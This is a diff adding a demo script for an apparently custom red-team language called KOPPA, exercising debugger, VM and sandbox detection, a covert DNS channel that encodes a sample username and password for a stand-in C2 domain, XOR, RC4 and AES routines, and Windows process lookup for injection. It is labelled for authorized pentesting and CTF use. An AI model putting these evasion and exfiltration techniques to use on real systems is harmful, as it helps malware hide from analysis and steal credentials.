@@ -1,0 +1,131 @@
+# KOPPA Security-Native Demo
+# Demonstrates: inject, mem, evasion, covert, crypt modules
+# For authorized pentesting / CTF / red team use only.
+
+import log, inject, evasion, covert, crypt
+
+fn demo_evasion() {
+    log.info("=== EVASION CHECKS ===")
+
+    let dbg = evasion.is_debugged()
+    log.info("Debugger attached: {dbg}")
+
+    let vm_result = evasion.is_vm()
+    let detected  = vm_result["detected"]
+    log.info("VM detected: {detected}")
+
+    let sb = evasion.is_sandbox()
+    let sb_detected = sb["detected"]
+    log.info("Sandbox detected: {sb_detected}")
+
+    let parent = evasion.check_parent()
+    log.info("Parent info: {parent}")
+
+    # Jitter sleep — also detects time acceleration
+    let slept = evasion.sleep(1)
+    let ratio = slept["ratio"]
+    let accel = slept["accelerated"]
+    log.info("Sleep ratio: {ratio}  accelerated: {accel}")
+}
+
+fn demo_covert_dns() {
+    log.info("=== COVERT DNS CHANNEL ===")
+
+    let secret = "op:exfil:user=admin&pass=hunter2"
+    let encoded = covert.dns_encode(secret, "c2.example.com")
+    let fqdn    = encoded["fqdn"]
+    log.info("DNS exfil FQDN: {fqdn}")
+
+    let decoded = covert.dns_decode(fqdn, "c2.example.com")
+    log.info("Decoded: {decoded}")
+}
+
+fn demo_crypt() {
+    log.info("=== CRYPTOGRAPHY ===")
+
+    # XOR cipher (always available, no deps)
+    let plaintext = "KOPPA secure data"
+    let key       = "s3cr3t_k3y"
+    let xored     = crypt.xor(plaintext, key)
+    log.info("XOR ciphertext (hex): {xored.hex}")
+
+    let unxored = crypt.xor(xored, key)
+    log.info("XOR decrypted: {unxored.to_str}")
+
+    # RC4
+    let rc4_ct = crypt.rc4(plaintext, key)
+    log.info("RC4 ciphertext (hex): {rc4_ct.hex}")
+    let rc4_pt = crypt.rc4(rc4_ct, key)
+    log.info("RC4 decrypted: {rc4_pt.to_str}")
+
+    # Key derivation
+    let kdf = crypt.derive_key("my_password", "random_salt_16b")
+    log.info("Derived key (hex): {kdf}")
+
+    # AES (needs pycryptodome or cryptography)
+    let aes_key = crypt.gen_key(256)
+    let iv      = crypt.gen_iv()
+    log.info("AES key generated ({aes_key.len} bytes)")
+
+    let enc = crypt.aes_encrypt(plaintext, aes_key, iv)
+    let ct  = enc["ciphertext"]
+    log.info("AES-256-CBC ciphertext (hex): {ct.hex}")
+
+    let dec_bytes = crypt.aes_decrypt(ct, aes_key, iv)
+    log.info("AES decrypted: {dec_bytes.to_str}")
+
+    # HMAC
+    let sig = crypt.hmac("message data", "signing_key")
+    log.info("HMAC-SHA256: {sig}")
+}
+
+fn demo_inject_info() {
+    log.info("=== INJECT MODULE (Windows only) ===")
+
+    let is_win = inject.is_windows()
+    log.info("Running on Windows: {is_win}")
+
+    if is_win {
+        let procs = inject.list_procs()
+        log.info("Running processes (first 5):")
+        var i = 0
+        for p in procs {
+            if i < 5 {
+                let pid  = p["pid"]
+                let name = p["name"]
+                log.info("  PID={pid}  {name}")
+                i = i + 1
+            }
+        }
+
+        let notepad_pid = inject.find_pid("notepad.exe")
+        log.info("notepad.exe PID: {notepad_pid}")
+    }
+}
+
+fn demo_unsafe_block() {
+    log.info("=== UNSAFE BLOCK EXAMPLE ===")
+    # unsafe {} marks code that performs OS-level ops
+    # Future: this block will transpile to Rust for native execution
+    unsafe {
+        let result = evasion.is_debugged()
+        log.info("(unsafe ctx) debugger: {result}")
+
+        let chk = evasion.is_vm()
+        let vm_found = chk["detected"]
+        if vm_found {
+            log.warn("VM environment — aborting ops")
+        } else {
+            log.info("Clean environment confirmed")
+        }
+    }
+}
+
+fn main() {
+    demo_evasion()
+    demo_covert_dns()
+    demo_crypt()
+    demo_inject_info()
+    demo_unsafe_block()
+    log.success("sec_native_demo complete")
+}
